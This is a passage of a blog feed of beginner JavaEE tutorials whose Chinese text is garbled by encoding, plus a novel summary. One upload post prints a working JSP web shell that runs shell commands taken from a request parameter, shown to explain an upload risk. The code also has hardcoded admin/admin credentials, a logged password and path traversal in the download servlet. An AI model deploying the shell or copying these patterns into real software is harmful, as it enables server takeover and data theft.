      <title>javaee Ëá™Âä®ÁôªÂΩï</title>
      <link href="/2018/05/24/javaee%20%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95/"/>
      <url>/2018/05/24/javaee%20%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/jacksoft/p/5216862.html" target="_blank" rel="noopener"> Ëá™Âä®ÁôªÂΩïÂèÇÁÖßÊÄùÊÉ≥ </a></p><hr><p>login..jsp</p><pre><code>&lt;%--  Created by IntelliJ IDEA.  User: Administrator  Date: 2018/5/24 0024  Time: ‰∏ãÂçà 6:22  To change this template use File | Settings | File Templates.--%&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body onload=&quot;login()&quot;&gt;    &lt;form id=&quot;form&quot; action=&quot;login&quot; method=&quot;post&quot; &gt;        &lt;input id=&quot;name&quot; type=&quot;text&quot; name=&quot;name&quot; value=&quot;&quot;/&gt;        &lt;input id=&quot;password&quot; type=&quot;password&quot; name=&quot;password&quot; value=&quot;&quot;/&gt;        Ëá™Âä®ÁôªÂΩï&lt;input type=&quot;checkbox&quot; name=&quot;check&quot;/&gt;        &lt;input id=&quot;token&quot; type=&quot;hidden&quot; name=&quot;token&quot;&gt;        &lt;input type=&quot;submit&quot; value=&quot;login&quot;/&gt;    &lt;/form&gt;    &lt;script type=&quot;text/javascript&quot;&gt;        function login() {            var cookies = document.cookie;            var name = cookies.split(&quot;;&quot;)[0].split(&quot;=&quot;)[1];            var token = cookies.split(&quot;;&quot;)[1].split(&quot;=&quot;)[1];            var checkon = cookies.split(&quot;;&quot;)[2].split(&quot;=&quot;)[1];            console.log(name +&quot; &quot;+token+&quot; &quot;+checkon);            console.log(checkon);            if(checkon==&quot;on&quot;){                console.log(&quot;yes&quot;);                var nameInp = document.getElementById(&quot;name&quot;);                nameInp.value = name;                console.log(nameInp);                var tokenInp = document.getElementById(&quot;token&quot;);                tokenInp.value = token;                document.getElementById(&quot;form&quot;).submit();            }        }    &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>loginservlet.java</p><pre><code>package servlet;import dao.AutoLoginDao;import dao.impl.AutoLoginImpl;import util.RandomUtil;import javax.servlet.ServletException;import javax.servlet.annotation.WebServlet;import javax.servlet.http.Cookie;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;@WebServlet(name = &quot;LoginServlet&quot;,urlPatterns = {&quot;/login&quot;})public class LoginServlet extends HttpServlet {    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {        request.setCharacterEncoding(&quot;utf-8&quot;);        response.setContentType(&quot;text/html;charset=utf-8&quot;);        String name = request.getParameter(&quot;name&quot;);        String password = request.getParameter(&quot;password&quot;);        String check = request.getParameter(&quot;check&quot;);        String token = request.getParameter(&quot;token&quot;);        System.out.println(&quot;name: &quot;+name+&quot;password: &quot;+password+&quot;check: &quot;+check);        if(name.equals(&quot;admin&quot;)&amp;&amp;password.equals(&quot;admin&quot;)){//Ê≠§Â§ÑÔºåÂ∫îËØ•ÊòØÂà§Êñ≠nameÂíåpasswordÊó∂ÂÄôÂú®Êï∞ÊçÆÂ∫ì            Cookie cookie = new Cookie(&quot;name&quot;,name);            cookie.setMaxAge(60*60);            token = RandomUtil.randomString(10);            Cookie cookie1 = new Cookie(&quot;token&quot;,token);            cookie1.setMaxAge(60*60);            AutoLoginDao ad = new AutoLoginImpl();            ad.addAutoLogin(name,token);//Â∞ÜÊï∞ÊçÆÊîæÂÖ•Êï∞ÊçÆÂ∫ì            Cookie cookie2 = new Cookie(&quot;check&quot;,check);            cookie2.setMaxAge(60*60);            response.addCookie(cookie);            response.addCookie(cookie1);            response.addCookie(cookie2);            response.getWriter().write(&quot;success&quot;);        }else if(token!=null&amp;&amp;!token.equals(&quot;&quot;)){//tokenÂ≠òÂú®‰∏î‰∏çÊòØ‰∏∫Á©∫            AutoLoginDao ad = new AutoLoginImpl();            boolean result = ad.selectByNameAndToken(name,token);//Âà§Êñ≠tokenÊòØÂê¶ÂíåÊï∞ÊçÆÂ∫ì‰∏ÄÊ†∑            if(result){                response.getWriter().write(&quot;success&quot;);            }else{                Cookie cookie2 = new Cookie(&quot;check&quot;,&quot;notOn&quot;);//Èò≤Ê≠¢ÈáçÂ§çË∑≥ËΩ¨                response.sendRedirect(&quot;login.jsp&quot;);            }        }else{            response.sendRedirect(&quot;login.jsp&quot;);//ÁôªÂΩï‰∏çÊàêÂäü        }    }    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {        doPost(request,response);    }}</code></pre><p>auto_login.sql</p><pre><code>create table auto_login(  id int primary key auto_increment,  user_id VARCHAR(30)  not null ,  token text not null);</code></pre><p>ÂÖ∑‰ΩìËøôËæπÁöÑtokenÈúÄË¶ÅÈöèÊú∫ÁîüÊàêÔºåÊâÄ‰ª•ÈúÄË¶ÅÁî®‰∏Ä‰∫õÁâπÂà´ÁöÑÂä†ÂØÜÁÆóÊ≥ïÔºåmd5Á≠âÁ≠â</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>javaee‰∏ä‰º†Êñá‰ª∂‰∏ãËΩΩÊñá‰ª∂</title>
      <link href="/2018/05/24/javaee%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/"/>
      <url>/2018/05/24/javaee%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p>*<em><em>‰∏ä‰º†</em> *</em></p><hr><p>upload.html</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;form action=&quot;upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;        &lt;!--enctype=&quot;multipart/form-data&quot;ÊîØÊåÅ‰∫åËøõÂà∂‰∏ä‰º†Êï∞ÊçÆÔºåapplication/x-www-form-urlencodedÊîØÊåÅÊñáÊú¨‰º†Ëæì--&gt;        &lt;input type=&quot;file&quot; name=&quot;file&quot;/&gt;        &lt;input type=&quot;file&quot; name=&quot;file2&quot;&gt;        &lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>UploadServlet.java</p><pre><code>package servlet;import javax.servlet.ServletException;import javax.servlet.annotation.MultipartConfig;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import javax.servlet.http.Part;import java.io.File;import java.io.IOException;import java.util.List;@WebServlet(name = &quot;UploadServlet&quot;,urlPatterns = {&quot;/upload&quot;})@MultipartConfig//ËØ•Ê≥®Ëß£‰∏ªË¶ÅÊòØ‰∏∫‰∫ÜËæÖÂä© Servlet 3.0 ‰∏≠ HttpServletRequest Êèê‰æõÁöÑÂØπ‰∏ä‰º†Êñá‰ª∂ÁöÑÊîØÊåÅpublic class UploadServlet extends HttpServlet {    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {        request.setCharacterEncoding(&quot;utf-8&quot;);        response.setContentType(&quot;text/html;charset=utf-8&quot;);        String path = request.getServletContext().getRealPath(&quot;&quot;);//Ëé∑ÂèñÊúçÂä°Âô®ÂΩìÂâçÁõÆÂΩï        List&lt;Part&gt; partList = (List&lt;Part&gt;)request.getParts();//Ëé∑Âæó        for(Part part: partList){            System.out.println(part.getName());            System.out.println(part.getSize());            System.out.println(part.getSubmittedFileName());//Ëøô‰∏™ÊñπÊ≥ïÂèØ‰ª•Ëé∑Âèñ‰∏ä‰º†Êñá‰ª∂Âêç            System.out.println(path);            part.write(path+ File.separator+part.getSubmittedFileName());//Êèê‰∫§Âú∞ÂùÄ        }    }    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {        doPost(request,response);    }}</code></pre><p><strong>ÂÆâÂÖ®ÈóÆÈ¢ò</strong><br>‰∏äÈù¢Ëøô‰∏™‰∏ä‰º†Êñá‰ª∂Áõ¥Êé•‰øùÂ≠òÂú®ÊúçÂä°Âô®ÂΩìÂâçÁõÆÂΩïÔºå‰πüÂ∞±ÊòØ‰Ω†‰º†‰∏™jspÊñá‰ª∂‰πüÂèØ‰ª•Ôºå‰∏ä‰º†ÊàêÂäüÔºå‰∏ãÈù¢Ëøô‰∏™cmd.jspÂ∞±ÂèØ‰ª•ÈÄ†ÊàêÂæàÂ§ßÁöÑÁ†¥Âùè</p><pre><code>&lt;%@ page import=&quot;java.util.*,java.io.*&quot;%&gt;&lt;%//// JSP_KIT//// cmd.jsp = Command Execution (unix)//// by: Unknown// modified: 27/06/2003//%&gt;&lt;HTML&gt;&lt;BODY&gt;&lt;FORM METHOD=&quot;GET&quot; NAME=&quot;myform&quot; ACTION=&quot;cmd.jsp&quot;&gt;&lt;INPUT TYPE=&quot;text&quot; NAME=&quot;cmd&quot;&gt;&lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt;&lt;/FORM&gt;&lt;pre&gt;&lt;%if (request.getParameter(&quot;cmd&quot;) != null) {        out.println(&quot;Command: &quot; + request.getParameter(&quot;cmd&quot;) + &quot;&lt;BR&gt;&quot;);        Process p = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));        OutputStream os = p.getOutputStream();        InputStream in = p.getInputStream();        DataInputStream dis = new DataInputStream(in);        String disr = dis.readLine();        while ( disr != null ) {                out.println(disr);                 disr = dis.readLine();                 }        }%&gt;&lt;/pre&gt;&lt;/BODY&gt;&lt;/HTML&gt;</code></pre><p>ÂÖ∑‰ΩìÔºå‰Ω†ÂèØ‰ª•Âú®ÊµèËßàÂô®‰∏≠ËæìÂÖ• ÔºåÔºåÔºå<br>localhost:8080/upload/cmd.jsp,ÁÑ∂ÂêéÂú®formË°®ÂçïËÉΩËæìÂÖ•Êåá‰ª§ipconfigÔºåÂèØ‰ª•Ëé∑ÂæóÊúçÂä°Âô®ÁöÑipÁ≠âÁ≠â„ÄÇ<br>ÊâÄ‰ª•ÔºåÂú®‰∏ä‰º†Êñá‰ª∂ÁöÑÊó∂ÂÄôË∑ØÂæÑË¶ÅÊîπÔºåpart.write(‚Äúc:‚Äù+<br>File.separator+part.getSubmittedFileName());,Áõ¥Êé•Â∞ÜÊñá‰ª∂‰øùÂ≠òÂú®cÔºöÁõò<br>ÔºåÂΩìÁÑ∂ÔºåÂÖ∑‰ΩìË∑ØÂæÑÔºå‰Ω†Ëá™‰æø</p><hr><p>‰∏ãËΩΩ<br>download.html</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;a href=&quot;download?fileName=gakki.jpg&quot;&gt;gakki.jpg&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>DownloadServlet</p><pre><code>package servlet;import javax.servlet.ServletException;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.File;import java.io.FileInputStream;import java.io.IOException;import java.io.OutputStream;@WebServlet(name = &quot;DownloadServlet&quot;,urlPatterns = {&quot;/download&quot;})public class DownloadServlet extends HttpServlet {    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {        request.setCharacterEncoding(&quot;utf-8&quot;);        response.setContentType(&quot;text/html;charset=utf-8&quot;);        String fileName = request.getParameter(&quot;fileName&quot;);        FileInputStream fis = new FileInputStream(&quot;c:&quot;+ File.separator+fileName);        response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment;filename=&quot;+fileName);        OutputStream os = response.getOutputStream();        byte[] buf = new byte[1024];        int l = -1;        while((l = fis.read(buf))!=-1){            os.write(buf,0,l);            os.flush();        }    }    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {        doPost(request,response);    }}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ‰∏ä‰º†‰∏ãËΩΩ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ajax jqueryÂÆûÁé∞ÂàÜÈ°µ</title>
      <link href="/2018/05/20/ajax%20jquery%E5%AE%9E%E7%8E%B0%E5%88%86%E9%A1%B5/"/>
      <url>/2018/05/20/ajax%20jquery%E5%AE%9E%E7%8E%B0%E5%88%86%E9%A1%B5/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/github_37483541/article/details/54944312" target="_blank" rel="noopener"> Ê®°‰ªø‰ª•‰∏ä‰ª£Á†Å </a></p><hr><p>html jsÈÉ®ÂàÜ</p><pre><code>&lt;body onload=&quot;loadData()&quot;&gt;&lt;h2&gt;ËØÑËÆ∫Âå∫&lt;/h2&gt;&lt;table id=&quot;mytable&quot;&gt;    &lt;tr&gt;        &lt;th&gt;name&lt;/th&gt;        &lt;th&gt;ËØÑËÆ∫&lt;/th&gt;        &lt;th&gt;score&lt;/th&gt;    &lt;/tr&gt;&lt;/table&gt;&lt;button onclick=&quot;reducePage()&quot;&gt;‰∏ä‰∏ÄÈ°µ&lt;/button&gt;&lt;button onclick=&quot;addPage()&quot;&gt;‰∏ã‰∏ÄÈ°µ&lt;/button&gt;//Ë∑≥ËΩ¨Âà∞ÊåáÂÆöÈ°µÈù¢ÔºåÂèØ‰ª•Ëé∑ÂèñËæìÂÖ•Ê°ÜÁöÑÂÄº&lt;script&gt;    var currentPage = 1;    var gid = ${goods.id};    function addPage() {        currentPage = currentPage + 1;        loadData();    }    function reducePage() {        currentPage = currentPage - 1;        loadData();    }    function loadData() {        // $(&quot;.detail&quot;).remove();//ÊØèÊ¨°‰ªéapiËé∑ÂèñÂÄºÊó∂ÔºåÂÖàÊ∏ÖÈô§Ë°®Ê†ºtrÁöÑÂÜÖÂÆπ        $.ajax({            url:&quot;GetCommentsController&quot;,            method:&quot;get&quot;,            data:&quot;currentPage=&quot;+currentPage+&quot;&amp;gid=&quot;+gid,            success:function (result) {                $(&quot;.detail&quot;).remove();//ÊØèÊ¨°‰ªéapiËé∑ÂèñÂÄºÊó∂ÔºåÂÖàÊ∏ÖÈô§Ë°®Ê†ºtrÁöÑÂÜÖÂÆπ                var results = JSON.parse(result);                for(var i=0;i&lt;results.length;i++){                    var id = results[i].id;                    var content = results[i].content;                    var user = results[i].user.name;                    var score = results[i].score;                    appendData(content,user,score);                }            }        });    }    function appendData(content,user,score) {        var text = &apos;&lt;tr class=&quot;detail&quot;&gt;&lt;td&gt;&apos;+user+&apos;&lt;/td&gt;&lt;td&gt;&apos;+content+&apos;&lt;/td&gt;&lt;td&gt;&apos;+score+&apos;&lt;/td&gt;&lt;/tr&gt;&apos;;        console.log(text);        $(&apos;#mytable&apos;).append(text);    }</code></pre><p>servletÈÉ®ÂàÜ</p><pre><code>@WebServlet(name = &quot;GetCommentsController&quot;,urlPatterns = {&quot;/GetCommentsController&quot;})public class GetCommentsController extends HttpServlet {    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {        request.setCharacterEncoding(&quot;utf-8&quot;);        response.setContentType(&quot;text/html;charset=utf-8&quot;);        String gid = request.getParameter(&quot;gid&quot;);        String currentPage = request.getParameter(&quot;currentPage&quot;);        System.out.println(gid+&quot; &quot;+currentPage);        CommentService cs = new CommentServiceImpl();        Goods goods = new Goods();        goods.setId(Integer.parseInt(gid));        Page page = new Page();        page.setNum(3);        page.setCurrentPage(Integer.parseInt(currentPage));        page.setTotal(PageUtil.totalByGoods(Integer.parseInt(gid),3));        List&lt;Comment&gt; commentList= cs.getAllComments(goods,page);        Gson gson = new Gson();        String str = gson.toJson(commentList);        System.out.println(str);        response.getWriter().write(str);    }    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {        doPost(request,response);    }}</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>filterÂÆûÁé∞Áî®Êà∑ÁôªÂΩïÂêéÊâçËÉΩÂèëÊñáÁ´†ÁöÑÂäüËÉΩ</title>
      <link href="/2018/05/14/filter%E5%AE%9E%E7%8E%B0%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%90%8E%E6%89%8D%E8%83%BD%E5%8F%91%E6%96%87%E7%AB%A0%E7%9A%84%E5%8A%9F%E8%83%BD/"/>
      <url>/2018/05/14/filter%E5%AE%9E%E7%8E%B0%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%90%8E%E6%89%8D%E8%83%BD%E5%8F%91%E6%96%87%E7%AB%A0%E7%9A%84%E5%8A%9F%E8%83%BD/</url>
      
        <content type="html"><![CDATA[<p><em>È¶ñÂÖàÔºåBBSËÆ∫ÂùõÊòØÊ∏∏ÂÆ¢ÂíåÁî®Êà∑ÈÉΩÂèØ‰ª•ËÆøÈóÆÁöÑÔºå‰ΩÜÊòØÂè™ÊúâÁî®Êà∑ÁôªÂΩïÂêéÊâçÂèØ‰ª•ÂèëÂ∏ñ</em><br><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373889.33953171410.png" alt="ËøôÈáåÂÜôÂõæÁâáÊèèËø∞"><br>Â¶ÇÂõæ‰∏≠ÔºåÂΩìÂâçÊ≤°‰∫∫Âú®Á∫øÔºåÂΩìÊàëÂú®‰∏ãÊñπÂèëÂ∏ñÂ§ÑËæìÂÖ•‰ø°ÊÅØÔºåÂπ∂ÂèëÂ∏ñ</p><pre><code>&lt;form method=&quot;post&quot; action=&quot;WriteArticleServlet.do&quot;&gt;      Ê†áÈ¢òÔºö&lt;input type=&quot;text&quot; placeholder=&quot;ËØ∑ËæìÂÖ•Ê†áÈ¢ò&quot; name=&quot;title&quot;&gt;&lt;br/&gt;      ÂÜÖÂÆπ:&lt;textarea name=&quot;content&quot;&gt;&lt;/textarea&gt;&lt;br/&gt;      &lt;button type=&quot;submit&quot;&gt;ÂèëÂ∏ñ&lt;/button&gt;  &lt;/form&gt;</code></pre><p>Ê≠§Â§ÑÊòØÂèëÂ∏ñÂ§ÑÁöÑ‰ª£Á†Å</p><pre><code>@WebServlet(name = &quot;WriteArticleServlet&quot;,urlPatterns = {&quot;/WriteArticleServlet.do&quot;})public class WriteArticleServlet extends HttpServlet {.....</code></pre><p>Ê≠§Â§ÑÊòØwriterArticleServletÁöÑ‰ª£Á†Å<br>‰∫éÊòØÔºåÂàõÂª∫‰∫Ü‰∏Ä‰∏™filter</p><pre><code>package filter;import entity.User;import javax.servlet.*;import javax.servlet.annotation.WebFilter;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import javax.servlet.http.HttpSession;import java.io.IOException;@WebFilter(filterName = &quot;WriteFilter&quot;,urlPatterns = {&quot;*.do&quot;})//Ê≠§Â§ÑÔºåÂØπ.doÁªìÂ∞æÁöÑËøõË°åËøáÊª§Ôºå‰∏ÄÂÆöË¶ÅÂÜôÂØπËøô‰∏™Ôºå‰∏çÁÑ∂TomcatÂ∞±‰∏çÊñ≠Êä•Èîôpublic class WriteFilter implements Filter {    public void destroy() {    }    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException {        HttpServletRequest httpServletRequest = (HttpServletRequest)req;        HttpServletResponse httpServletResponse = (HttpServletResponse)resp;        HttpSession session = httpServletRequest.getSession();        User user = (User)session.getAttribute(&quot;user&quot;);//Ëé∑ÂæóÂΩìÂâçÁöÑÁî®Êà∑ÔºåÂ¶ÇÊûú‰∏çÂ≠òÂú®ËøîÂõûnull        if(user!=null) {            System.out.println(&quot;ÈÄöËøáfilter&quot;);            chain.doFilter(req, resp);ÂÖ≥‰∫échain.doFilter(request,response)            //‰ªñÁöÑ‰ΩúÁî®ÊòØÂ∞ÜËØ∑Ê±ÇËΩ¨ÂèëÁªôËøáÊª§Âô®Èìæ‰∏ä‰∏ã‰∏Ä‰∏™ÂØπË±°„ÄÇËøôÈáåÁöÑ‰∏ã‰∏Ä‰∏™ÊåáÁöÑÊòØ‰∏ã‰∏Ä‰∏™filterÔºåÂ¶ÇÊûúÊ≤°ÊúâfilterÈÇ£Â∞±ÊòØ‰Ω†ËØ∑Ê±ÇÁöÑËµÑÊ∫ê„ÄÇ ‰∏ÄËà¨filterÈÉΩÊòØ‰∏Ä‰∏™Èìæ,web.xml ÈáåÈù¢ÈÖçÁΩÆ‰∫ÜÂá†‰∏™Â∞±ÊúâÂá†‰∏™„ÄÇ‰∏Ä‰∏™‰∏Ä‰∏™ÁöÑËøûÂú®‰∏ÄËµ∑            //request -&gt; filter1 -&gt; filter2 -&gt;filter3 -&gt; .... -&gt; request resource.        }else{            System.out.println(&quot;Ê≤°ÊúâÈÄöËøáfilter&quot;);            httpServletResponse.sendRedirect(&quot;login.html&quot;);        }    }    public void init(FilterConfig config) throws ServletException {    }}</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>javaee mvc</title>
      <link href="/2018/05/13/javaee%20mvc/"/>
      <url>/2018/05/13/javaee%20mvc/</url>
      
        <content type="html"><![CDATA[<p><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373890.33350731068.png" alt="mvc"></p><hr><p>ÂÖ∑‰ΩìÂåÖÂÜÖÁöÑ‰ø°ÊÅØ<br><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373890.5168879459.png" alt="ÁªìÊûÑ"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Ê¢¶ÂπªËä±-‰∏úÈáéÂú≠ÂêæËØª‰π¶Á¨îËÆ∞</title>
      <link href="/2018/04/28/%E6%A2%A6%E5%B9%BB%E8%8A%B1-%E4%B8%9C%E9%87%8E%E5%9C%AD%E5%90%BE%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
      <url>/2018/04/28/%E6%A2%A6%E5%B9%BB%E8%8A%B1-%E4%B8%9C%E9%87%8E%E5%9C%AD%E5%90%BE%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>Ê¢¶ÂπªËä±ÔºàÈªÑËâ≤ÁâµÁâõËä±ÔºâÔºöÂú®Âæà‰πÖ‰ª•ÂâçÂá∫Áé∞ÔºåÂê∏È£üËÄÖ‰ºöÊúâËá¥Âπª‰ΩúÁî®ÔºåÔºàÁ±ª‰ººÊØíÂìÅÔºâÔºåÂΩìÊó∂Êó•Êú¨ÂÆòÊñπÔºåÂëΩ‰ª§‰∫∫Ê∏ÖÈô§ÊâÄÊúâÁâµÁâõËä±„ÄÇÂêéÊù•ÔºåË≠¶ÊñπÔºàËí≤ÁîüÁ•ñËæàÔºâÂíåÂåªÁîüÔºà‰æùÂ∫≠Á•ñËæàÔºâÂèëÁé∞ÔºåÈªÑËâ≤ÁâµÁâõËä±ÂèØ‰ª•ËÆ©Â´åÁäØËØ¥ÁúüËØùÔºå‰∏çÊñôÈªÑËâ≤ÁâµÁâõËä±Êï£ËêΩ‰∫∫Èó¥ÔºåË¢´Ê∞ëÈó¥ÔºàÁî∞‰∏≠ÂíåÈÅìÔºâËé∑Âæó„ÄÇ<br>Â•≥ÊòüÂõ†‰∏∫ÊäëÈÉÅÂéª‰∏ñÔºåÁî∞‰∏≠ÂíåÈÅì‰Ωú‰∏∫‰ªñÁöÑÁªàÊûÅÁ≤â‰∏ùÔºåÂæóÁü•ÂêéÊï¥Êó•‰º§ÂøÉÔºåÂπ∂ÊúçÁî®ÈªÑËâ≤ÁâµÁâõËä±ÁßçÂ≠êÔºåÂú®Â•≥ÊòüÂéª‰∏ñÁöÑ‰∏ã‰∏Ä‰∏™ÊúàÁöÑÈÇ£Â§©ÔºåÂê∏È£üËøáÂ§öÔºåÂèëÁñØÊãøÊ≠¶Â£´ÂàÄÂà∞Â§ßË°ó‰∏äÂ∞ÜÁúü‰∏ÄÔºåÂíåÂ≠êÊùÄÊ≠ªÔºåËøô‰∏™‰∫ã‰ª∂‰∏∫MM‰∫ã‰ª∂„ÄÇ<br>Áî∞‰∏≠ÂíåÈÅìÊ≠ªÂêéÔºåÁßçÂ≠êË¢´‰ªñÁöÑÁà∂‰∫≤Â∑•Ëó§Â∏¶Âõû‰∫ÜËÄÅÂÆ∂„ÄÇ<br>Áúü‰∏ÄÂíåÂíåÂ≠êÁöÑÂ•≥ÂÑøÂøóÊë©Â≠êÔºåË¢´‰∫≤ÊàöÂÖªÂ§ß„ÄÇ<br>Ëí≤ÁîüÁúüÂó£Êúâ‰∏Ä‰∏™ÂÑøÂ≠êË¶Å‰ªãÔºåÂ®∂‰∫ÜÂøóÊë©Â≠ê‰Ωú‰∏∫‰∫åÊàøÂ§™Â§™ÔºåÊòØ‰∏∫‰∫ÜË°•ÂÅøÂøóÊë©Â≠êÂÆ∂Êóè„ÄÇÂêéÊù•Áîü‰∏ãËãçÂ§™„ÄÇËí≤ÁîüÁöÑÂ§ßÂÆ∂Êóè‰∏≠ÔºåÂ∞±ËãçÂ§™‰∏çÁü•ÈÅìÁâµÁâõËä±Ëøô‰ª∂‰∫ãÔºåÊòØÁúüÂó£‰∏çÂ∏åÊúõ‰∏ã‰∏ÄËæàÁü•ÈÅìËøô‰∫õ„ÄÇÂØπÂÖ∂ÊúâÊâÄÈöêÁûí„ÄÇ<br>Ëí≤ÁîüÂÆ∂ÊóèÔºåÂõ†‰∏∫‰∏∫‰∫ÜÂØªÊâæÈªÑËâ≤ÁâµÁâõËä±Ôºå‰∏ÄÁõ¥‰ºöÊúâÊØèÂπ¥ÂÆöÊúüÂéªÁúãÁâµÁâõËä±ÁöÑËä±‰ºöÔºåËãçÂ§™ÂæàÂèçÊÑüÔºå‰∏ÄÊ¨°Âõ†‰∏∫ËÑöÁñºÔºåÂÅöÂà∞Ëä±‰ºö‰∏≠Èó¥‰ºëÊÅØÁöÑÂú∞ÊñπÔºåÂÅ∂ÈÅá‰æùÂ∫≠ÁöÑÂêé‰∫∫Â≠ùÁæé„ÄÇËãçÂ§™ÂíåÂ≠ùÁæé‰∏ÄËßÅÈíüÊÉÖ„ÄÇ‰∫§ÂæÄ‰∏ÄÊÆµÊó∂Èó¥ÂêéÔºåÁúüÂó£ÂèëÁé∞Ëøô‰ª∂‰∫ãÔºåÂæàÂèçÂØπ„ÄÇÂΩìÊó∂Ôºå‰æùÂ∫≠ÂÆ∂ÊóèÂíåËí≤ÁîüÂÆ∂Êóè‰ºö‰∫íÁõ∏‰∫§Êç¢ÁßòÂØÜÔºå‰πüÂ∞±Áü•ÈÅì‰∫Ü‰ªñ‰ª¨‰∏§ÁöÑÊÅãÊÉÖÔºåÂ≠ùÁæéÂÜ≥ÂÆö‰∏çËßÅËãçÂ§™„ÄÇ<br>Â∞ö‰∫∫Ôºå‰∏Ä‰∏™Èü≥‰πêÂÆ∂„ÄÇ‰ªñÊúâ‰∏™Â¶πÂ¶πÔºåÊ¢®‰πÉÔºåÊòØ‰∏Ä‰∏™Ê∏∏Ê≥≥Â•ΩÊâãÔºåÂ∞ö‰∫∫‰∏ÄÁõ¥Ê¥ªÂú®Ê¢®‰πÉÁöÑÂÖâËæâ‰∏ã„ÄÇÂ∞ö‰∫∫ÂíåÂêåÂ≠¶ÈõÖÂìâÂàõÂª∫Á§æÂõ¢ÔºåÂêéÊù•ÈõÖÂìâ‰∏ÄÊ¨°ÂÅ∂ÈÅáÂ∑•Ëó§ÔºåÂ∑•Ëó§ÂëäËØâÈõÖÂìâÂèØ‰ª•ÊúçÁî®ÁßçÂ≠êËé∑ÂæóÁÅµÊÑüÔºå‰ΩÜÊòØ‰∏çËÉΩÊúçÁî®Â§™Â§ö„ÄÇÈõÖÂìâÁî®ËøáÂêéÔºåÂèàËÆ©Â∞ö‰∫∫ÊúçÁî®ÔºåÂàõÈÄ†Âá∫‰∏çÂ∞ë‰ΩúÂìÅ„ÄÇÂ∞ö‰∫∫Â∞ÜÁßçÂ≠êÁªôËá™Â∑±Áà∑Áà∑ÁßãÂ±±Âë®Ê≤ªÔºåÂ∏åÊúõËÉΩÂ§ßÈáèÁπÅÊÆñÁßçÂ≠ê„ÄÇÂ∞ö‰∫∫Âõ†‰∏∫ÊúçÁî®ÔºåËøáÂ§öÔºåË∑≥Ê•ºËá™ÊùÄ„ÄÇÈõÖÂìâÊÄï‰∫ãÊÉÖË¥•Èú≤ÔºåÈÅÇÂéªÂØªÁßãÂ±±Âë®Ê≤ªÔºåÁªìÊûúÁßãÂ±±Âë®Ê≤ªÁ´üÁÑ∂ÂΩìÂú∫Ë¶ÅÊä•Ë≠¶Ôºå‰∫éÊòØÈõÖÂìâÊùÄÂÆ≥‰∫ÜÁßãÂ±±Âë®Ê≤ª„ÄÇ<br>ÂêéÊù•Â∞±ÊòØÊ¢®‰πÉÔºåËãçÂ§™ÔºåË¶Å‰ªãÔºåÂ≠ùÁæéÔºåÊó©ÊøëÂØªÊâæÊùÄ‰∫∫Âá∂ÊâãÁöÑËøáÁ®ã‰∫Ü„ÄÇ</p>]]></content>
      
      
      
        <tags>
            
            <tag> ‰∏úÈáéÂú≠Âêæ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javascript</title>
      <link href="/2018/04/27/javascript/"/>
